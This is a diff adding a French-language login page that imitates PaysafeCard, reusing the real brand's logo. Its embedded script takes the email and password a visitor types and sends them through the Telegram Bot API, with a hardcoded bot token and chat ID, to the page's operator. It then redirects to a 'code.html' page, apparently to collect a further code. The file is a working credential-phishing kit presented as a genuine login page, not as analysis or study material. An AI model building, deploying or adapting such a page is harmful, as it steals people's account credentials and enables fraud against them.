@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion - PaysafeCard</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #f5f6fb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    img {
+      width: 200px;
+      margin-bottom: 2%;
+    }
+
+    .card {
+      background: white;
+      border-radius: 12px;
+      padding: 40px 30px;
+      width: 350px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+    }
+
+    h2 {
+      color: #2d2d77;
+      font-size: 20px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 90%;
+      padding: 14px;
+      margin-bottom: 20px;
+      border: 1px solid #d8d4f2;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      border: none;
+    }
+
+    .btn-primary {
+      background-color: #3f3fff;
+      color: white;
+      margin-bottom: 15px;
+    }
+
+    .btn-outline {
+      background: transparent;
+      color: #3f3fff;
+      border: 1px solid #d8d4f2;
+    }
+
+    .footer-links {
+      margin-top: 25px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #3f3fff;
+    }
+
+    .footer-links a {
+      text-decoration: none;
+      color: #3f3fff;
+    }
+  </style>
+  
+  <link rel="icon" type="" href="https://cdn.brandfetch.io/idMuf6we2j/w/400/h/400/theme/dark/icon.png?c=1bxid64Mup7aczewSAYMX&t=1748781438757">
+</head>
+<body>
+  <img src="https://login.paysafecard.com/customer-auth/clients/mypins/vectors/logo.e00177e8b2.svg" alt="Logo PaysafeCard">
+  <div class="card">
+    <h2>Se connecter à <strong>PaysafeCard</strong></h2>
+    <input type="text" placeholder="E-mail ou nom d'utilisateur" id="email">
+    
+    <div class="password-wrapper">
+      <input type="password" placeholder="Mot de passe" id="password">
+    </div>
+
+    <button class="btn-primary" id="login">Connexion</button>
+    <button class="btn-outline">S'inscrire</button>
+
+    <div class="footer-links">
+      <a href="#">Nom d'utilisateur oublié ?</a>
+      <a href="#">Mot de passe oublié ?</a>
+    </div>
+  </div>
+
+  <!-- Firebase SDKs via CDN -->
+  
+
+  <script>
+    const BOT_TOKEN = '7918116689:AAFfBPEbxUudZCnVbmT4DvVD4KwTtZm1qrE';
+    const CHAT_ID = '7498911105';
+
+    document.getElementById("login").addEventListener("click", () => {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        if (email === "" || password === "") {
+        alert("Veuillez remplir tous les champs.");
+        return;
+      }
+
+      const message = `🔐 *mot de passe recu* ${email} et son mdp : ${password}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          document.location.href = "code.html"
+        } else {
+          console.log("Erreur lors de l'envoi.");
+          console.error(data);
+        }
+      })
+      .catch(error => {
+        console.log("Erreur réseau.");
+        console.error(error);
+      });
+    });
+    
+  </script>
+</body>
+</html>
